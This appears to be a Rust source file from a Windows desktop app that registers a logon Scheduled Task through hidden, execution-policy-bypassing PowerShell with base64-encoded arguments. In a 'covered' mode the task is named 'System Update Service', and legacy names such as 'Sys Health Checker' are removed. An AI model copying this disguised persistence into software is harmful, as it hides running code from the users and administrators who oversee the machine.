// Machine-scoped logon autostart via a Scheduled Task — replaces the per-user
// HKCU `Run` key the tauri-plugin-autostart wrote.
//
// Why a Scheduled Task, not a Run key:
//   1. A Run value only autostarts for the ONE account that wrote it; this app
//      keeps its state machine-wide, so autostart should cover every account.
//   2. A Run value goes stale if a portable exe is moved; we re-point the task
//      at the CURRENT exe on every launch (idempotent), so it self-heals.
//   3. A Run key can go stale when a portable executable is moved. The task is
//      refreshed on launch and deliberately runs at the user's normal level.
//
// The task uses a BUILTIN\Users (S-1-5-32-545) group principal + an at-logon
// trigger, so it fires for any user's logon inside that user's interactive
// session. It must not run elevated: update and autostart work must never gain
// the ability to affect another RDS user's desktop.

const COVERED_TASK_NAME: &str = "System Update Service";

fn task_name(covered: bool) -> String {
    if covered {
        COVERED_TASK_NAME.to_string()
    } else {
        format!("{} Autostart", crate::paths::app_display_name())
    }
}

fn covered_identity_active() -> bool {
    crate::paths::hide_flag_path()
        .map(|path| path.exists())
        .unwrap_or(false)
        || crate::startup_auth::startup_pin_is_configured_sync()
}

#[cfg(windows)]
const CREATE_NO_WINDOW: u32 = 0x08000000;

#[cfg(windows)]
const AUTOSTART_POWERSHELL: &str = "powershell.exe";

/// The app manifest uses `highestAvailable`. A Scheduled Task cannot display
/// the corresponding consent prompt, so an administrator's logon task exits
/// with 0x800702E4 before the app starts. Preserve the limited group task and
/// force this launch to use the interactive user's normal token instead.
///
/// Task Scheduler discards a child process's stderr. Keep that evidence in the
/// relevant profile rather than ProgramData, which a standard user cannot
/// write. The file is overwritten on each autostart attempt so it stays useful
/// for the latest failure and cannot grow without bound.
#[cfg(windows)]
fn autostart_action_args(exe: &str) -> String {
    let exe_ps = exe.replace('\'', "''");
    format!(
        "-NoProfile -NonInteractive -WindowStyle Hidden -Command \"$ErrorActionPreference='Stop'; $dir=Join-Path $env:LOCALAPPDATA 'WinCommander'; New-Item -ItemType Directory -Path $dir -Force | Out-Null; $log=Join-Path $dir 'autostart.stderr.log'; $env:__COMPAT_LAYER='RunAsInvoker'; & '{exe_ps}' --autostart 2> $log; exit $LASTEXITCODE\""
    )
}

/// Repair the machine-wide logon autostart task only when its identity or
/// execution contract has drifted. A correct task is left untouched, avoiding
/// a Scheduled Tasks write on every packaged launch.
#[cfg(windows)]
#[tauri::command]
pub fn ensure_autostart_task() -> Result<(), String> {
    ensure_autostart_task_named(covered_identity_active())
}

#[cfg(windows)]
fn ensure_autostart_task_named(covered: bool) -> Result<(), String> {
    use std::os::windows::process::CommandExt;

    let exe = std::env::current_exe()
        .map_err(|e| format!("current_exe: {e}"))?
        .to_string_lossy()
        .to_string();
    // PowerShell single-quoted literals: double any embedded single quote.
    let name_ps = task_name(covered).replace('\'', "''");
    let stale_name_ps = task_name(!covered).replace('\'', "''");
    let run_value = crate::paths::app_display_name().replace('\'', "''");
    let action_args = autostart_action_args(&exe);
    let action_args_b64 = {
        use base64::{engine::general_purpose::STANDARD, Engine as _};
        let utf16: Vec<u8> = action_args
            .encode_utf16()
            .flat_map(u16::to_le_bytes)
            .collect();
        STANDARD.encode(utf16)
    };

    let script = format!(
        "$ErrorActionPreference='Stop'
$actionArgs = [System.Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('{action_args_b64}'))
$task = Get-ScheduledTask -TaskName '{name}' -ErrorAction SilentlyContinue
$needsRepair = $null -eq $task
if (-not $needsRepair) {{
  $action = @($task.Actions)
  $logonTrigger = @($task.Triggers | Where-Object {{ $_.CimClass.CimClassName -eq 'MSFT_TaskLogonTrigger' }})
  $needsRepair = $action.Count -ne 1 -or $action[0].Execute -ne '{powershell}' -or $action[0].Arguments -ne $actionArgs -or $logonTrigger.Count -ne 1 -or $task.Principal.GroupId -ne 'S-1-5-32-545' -or $task.Principal.RunLevel -ne 'Limited' -or $task.Settings.MultipleInstances -ne 'IgnoreNew' -or $task.Settings.ExecutionTimeLimit -ne 'PT0S'
}}
$staleTask = Get-ScheduledTask -TaskName '{stale_name}' -ErrorAction SilentlyContinue
$legacyTasks = @('Sys Health Checker', 'WinCommander Input Service') | Where-Object {{ Get-ScheduledTask -TaskName $_ -ErrorAction SilentlyContinue }}
$legacyRun = Get-ItemPropertyValue -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' -Name '{run}' -ErrorAction SilentlyContinue
if ($staleTask -or $legacyTasks.Count -gt 0 -or $null -ne $legacyRun -or (Test-Path -LiteralPath \"$env:ProgramData\\WinCommander\\reopen.cfg\")) {{ $needsRepair = $true }}
if ($needsRepair) {{
$a = New-ScheduledTaskAction -Execute '{powershell}' -Argument $actionArgs
$t = New-ScheduledTaskTrigger -AtLogOn
$p = New-ScheduledTaskPrincipal -GroupId 'S-1-5-32-545' -RunLevel Limited
$s = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -ExecutionTimeLimit ([TimeSpan]::Zero) -MultipleInstances IgnoreNew
Register-ScheduledTask -TaskName '{name}' -Action $a -Trigger $t -Principal $p -Settings $s -Force | Out-Null
Unregister-ScheduledTask -TaskName '{stale_name}' -Confirm:$false -ErrorAction SilentlyContinue
Unregister-ScheduledTask -TaskName 'Sys Health Checker' -Confirm:$false -ErrorAction SilentlyContinue
Unregister-ScheduledTask -TaskName 'WinCommander Input Service' -Confirm:$false -ErrorAction SilentlyContinue
Remove-Item -LiteralPath \"$env:ProgramData\\WinCommander\\reopen.cfg\" -Force -ErrorAction SilentlyContinue
Remove-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' -Name '{run}' -ErrorAction SilentlyContinue
}}",
        name = name_ps,
        stale_name = stale_name_ps,
        run = run_value,
        action_args_b64 = action_args_b64,
        powershell = AUTOSTART_POWERSHELL,
    );

    let out = std::process::Command::new("powershell")
        .args([
            "-NoProfile",
            "-NonInteractive",
            "-ExecutionPolicy",
            "Bypass",
            "-Command",
            &script,
        ])
        .creation_flags(CREATE_NO_WINDOW)
        .output()
        .map_err(|e| format!("spawn powershell: {e}"))?;
    if out.status.success() {
        crate::log::log_message(
            "info",
            &format!("autostart task checked/repaired: {}", name_ps),
        );
        Ok(())
    } else {
        let err = format!(
            "autostart task registration failed: {}",
            String::from_utf8_lossy(&out.stderr).trim()
        );
        crate::log::log_message("warn", &err);
        Err(err)
    }
}

#[cfg(windows)]
#[tauri::command]
pub fn update_autostart_task_identity(covered: bool) -> Result<(), String> {
    ensure_autostart_task_named(covered)
}

#[cfg(not(windows))]
#[tauri::command]
pub fn update_autostart_task_identity(_covered: bool) -> Result<(), String> {
    Ok(())
}

#[cfg(not(windows))]
#[tauri::command]
pub fn ensure_autostart_task() -> Result<(), String> {
    Ok(())
}

/// Remove the autostart task (for a future "disable autostart" control; the
/// Lockdown cascade already sweeps `*WinCommander*` tasks on self-destruct).
#[cfg(windows)]
#[tauri::command]
pub fn remove_autostart_task() -> Result<(), String> {
    use std::os::windows::process::CommandExt;
    let normal_name_ps = task_name(false).replace('\'', "''");
    let covered_name_ps = task_name(true).replace('\'', "''");
    let script = format!(
        "Unregister-ScheduledTask -TaskName '{normal}' -Confirm:$false -ErrorAction SilentlyContinue
Unregister-ScheduledTask -TaskName '{covered}' -Confirm:$false -ErrorAction SilentlyContinue",
        normal = normal_name_ps,
        covered = covered_name_ps,
    );
    let _ = std::process::Command::new("powershell")
        .args([
            "-NoProfile",
            "-NonInteractive",
            "-ExecutionPolicy",
            "Bypass",
            "-Command",
            &script,
        ])
        .creation_flags(CREATE_NO_WINDOW)
        .output();
    Ok(())
}

#[cfg(not(windows))]
#[tauri::command]
pub fn remove_autostart_task() -> Result<(), String> {
    Ok(())
}
